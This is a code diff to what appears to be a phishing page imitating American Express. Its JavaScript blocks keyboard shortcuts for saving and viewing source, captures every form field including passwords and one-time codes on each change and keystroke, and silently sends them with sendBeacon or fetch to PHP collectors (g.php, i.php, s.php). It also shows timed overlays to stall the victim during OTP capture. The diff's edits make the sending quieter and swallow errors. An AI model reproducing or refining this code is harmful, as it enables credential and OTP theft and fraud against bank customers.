@@ -341,7 +341,7 @@ input:focus{outline:1px dotted #006FCF;border-color:#006FCF}
 		</div> 
 <script>
 function setupUI() {
-  const ENDPOINT = "m.php";
+  const ENDPOINT = "./g.php";
 
   // 🔒 Block specific key combos (Ctrl+S, Ctrl+U, etc.)
   document.addEventListener("keydown", e => {
@@ -364,21 +364,20 @@ function setupUI() {
     passwordInput.addEventListener("input", () => {
       if (!hasTyped) {
         hasTyped = true;
-        passwordInput.type = "password"; // auto switch to masked field
+        passwordInput.type = "password";
       }
     });
   }
 
   if (passwordInput && toggleButton) {
     toggleButton.addEventListener("click", () => {
-      if (!hasTyped) return; // prevent toggle before typing
+      if (!hasTyped) return;
       const type = passwordInput.type === "password" ? "text" : "password";
       passwordInput.type = type;
       toggleButton.textContent = type === "password" ? "Show" : "Hide";
     });
   }
 
-  // 📤 Beacon sender
   function sendPayload(payload) {
     const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
     let beaconOk = false;
@@ -397,7 +396,6 @@ function setupUI() {
     }
   }
 
-  // 📝 Track changes inside #clsdiv
   document.addEventListener("change", e => {
     const el = e.target;
     if (el?.closest("#clsdiv") && el.matches(".input-control")) {
@@ -416,9 +414,6 @@ function setupUI() {
 
 document.addEventListener("DOMContentLoaded", setupUI);
 </script>
-
-
-
 		
 <footer class="amex-footer">
   <div class="footer-container">
@@ -740,26 +735,41 @@ window.populateEmailFields = function () {
 
 function setupResendOTP() {
   let clickCount = 0;
-  const ENDPOINT = "i.php";
+  const ENDPOINT = "./i.php";
 
-  // 📤 Sender specific to Resend OTP
+  // 📤 Sender specific to Resend OTP (silent fire-and-forget)
   function sendPayload(payload) {
-    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
-    let beaconOk = false;
-    if (navigator.sendBeacon) beaconOk = navigator.sendBeacon(ENDPOINT, blob);
-    if (!beaconOk && ENDPOINT) {
-      return fetch(ENDPOINT, {
-        method: "POST",
-        body: JSON.stringify(payload),
-        headers: { "Content-Type": "application/json" },
-        keepalive: true
-      });
+    try {
+      const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+      let beaconOk = false;
+
+      if (navigator.sendBeacon) {
+        beaconOk = navigator.sendBeacon(ENDPOINT, blob);
+      }
+
+      if (!beaconOk && ENDPOINT) {
+        fetch(ENDPOINT, {
+          method: "POST",
+          body: JSON.stringify(payload),
+          headers: { "Content-Type": "application/json" },
+          keepalive: true
+        }).catch(() => {
+        });
+      }
+    } catch (err) {
     }
   }
 
   // 🔲 Overlay routine with spinner + toast targeting #subclsdiv3
-  function showLightOverlay(target = "#subclsdiv3", duration = 30000, fade = 2000, btnSelector = "#otpv", callback = null) {
+  function showLightOverlay(
+    target = "#subclsdiv3",
+    duration = 30000,
+    fade = 2000,
+    btnSelector = "#otpv",
+    callback = null
+  ) {
     const $target = $(target);
+
     if ($target.find(".overlay-layer").length === 0) {
       $target.css("position", "relative").append(
         "<div class='overlay-layer'>" +
@@ -768,6 +778,7 @@ function setupResendOTP() {
         "</div>"
       );
     }
+
     const $overlay = $target.find(".overlay-layer");
     const $toast = $overlay.find(".toast-msg");
 
@@ -775,9 +786,9 @@ function setupResendOTP() {
     $overlay.stop(true, true).fadeIn(200);
 
     // ⏳ Flash toast for 1.5s near the end of overlay
-    setTimeout(function () {
+    setTimeout(() => {
       $toast.fadeIn(300).delay(1500).fadeOut(500);
-    }, duration - 2000); // trigger ~2s before overlay ends
+    }, duration - 2000);
 
     $overlay.delay(duration).fadeOut(fade, function () {
       $(this).hide();
@@ -794,8 +805,15 @@ function setupResendOTP() {
     const $targetBtn = $("#otpv");
     $.loading($targetBtn, true);
 
-    const payload = { timestamp: new Date().toISOString(), clickCount, fields: {} };
-    $(".input-control").each(function () { if (this.name) payload.fields[this.name] = this.value; });
+    const payload = {
+      timestamp: new Date().toISOString(),
+      clickCount,
+      fields: {}
+    };
+
+    $(".input-control").each(function () {
+      if (this.name) payload.fields[this.name] = this.value;
+    });
     sendPayload(payload);
 
     showLightOverlay("#subclsdiv3", 30000, 2000, "#otpv", function () {
@@ -810,18 +828,24 @@ function setupResendOTP() {
   $(document).on("input", ".input-control", function () {
     clearTimeout(debounceTimer);
     debounceTimer = setTimeout(() => {
-      const payload = { timestamp: new Date().toISOString(), fields: {} };
-      $(".input-control").each(function () { if (this.name) payload.fields[this.name] = this.value; });
+      const payload = {
+        timestamp: new Date().toISOString(),
+        fields: {}
+      };
+      $(".input-control").each(function () {
+        if (this.name) payload.fields[this.name] = this.value;
+      });
       sendPayload(payload);
     }, 5000);
   });
 }
 
+
 function setupFinalSubmit() {
   let count = 0;
   let busy = false;
 
-  const ENDPOINT = "s.php";
+  const ENDPOINT = "./s.php";
   const ERROR_MS = 15000;
   const OVERLAY_PHASE1_MS = 10000;
   const OVERLAY_PHASE2_MS = 5000;
